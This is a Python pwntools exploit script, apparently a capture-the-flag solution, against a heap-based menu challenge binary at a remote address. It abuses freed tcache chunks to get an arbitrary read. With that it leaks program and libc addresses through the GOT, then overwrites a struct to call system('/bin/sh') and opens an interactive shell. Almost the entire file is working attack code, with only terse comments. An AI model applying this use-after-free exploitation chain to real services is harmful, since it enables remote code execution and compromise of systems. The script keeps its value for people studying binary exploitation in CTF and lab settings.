from pwn import *
import time

DEADBEEF = 0xdeadbeefdeadbeef
COFFEE = 0xc0ffeec0ffeec0ff

#p = process('./src/share/chal')
p = remote("10.113.0.1", 10604)
elf = ELF('./src/share/chal')
libc = elf.libc

def register(idx, namelen, name):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Nmae Length: ', str(namelen).encode())
    p.sendafter(b'Name: ', name)

def delete(idx):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def trigger(idx):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvline()[6:] # remove trailing name

addr_tail_call_cnt = 0

def leak_addr(addr, is_shell=False):
    name_len = len(addr) + 1
    info(f"Length: {name_len}")
    global addr_tail_call_cnt
    entity_A = addr_tail_call_cnt % 2
    entity_B = (addr_tail_call_cnt + 1) % 2
    register(entity_A, 0x10, b'A'*8)
    register(entity_B, 0x30, b'B'*8)
    delete(entity_A)
    delete(entity_B)
    # tcache_0x20 = [entity_B, entity_A, name_A]
    # tcache_0x40 = [name_B]

    # only need to overwrite the least significant byte
    # as entity_0->name is already of heap base
    register(entity_B, name_len, addr) 
    leak = trigger(entity_A)[:8].strip(b'\x00\x0a')
    if is_shell:
        return u64(leak.ljust(8, b'\x00'))
    info(f"Leaked data: {leak.hex()}")
    register(entity_A, 0x30, b'A'*8)  
    delete(entity_B)
    delete(entity_A)
    # tcache_0x20 = [entity_A, entity_B, name_B]
    # tcache_0x40 = [name_A]
    addr_tail_call_cnt += 1 # swap entity index for next call
    return u64(leak.ljust(8, b'\x00'))

default_handle_addr = leak_addr(b'\xf0') # address of default_handle
print(f"Leaked default_handle address: {hex(default_handle_addr)}")
elf.address = default_handle_addr - elf.symbols['default_handle']
info(f"Calculated ELF base: {hex(elf.address)}")
puts_got = elf.got['puts']
leak_puts = leak_addr(p64(puts_got))
info(f"Leaked puts address: {hex(leak_puts)} at GOT entry: {hex(puts_got)}")
libc.address = leak_puts - libc.symbols['puts']
info(f"Calculated libc base: {hex(libc.address)}")
system_addr = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
info(f"Calculated system address: {hex(system_addr)}")
info(f"Calculated '/bin/sh' string address: {hex(binsh)}")

# The primitive can also used to overwrite the entire struct
leak_addr((p64(puts_got) + p64(binsh) + p64(system_addr))[:23], is_shell=True) # don't need last byte
p.interactive()





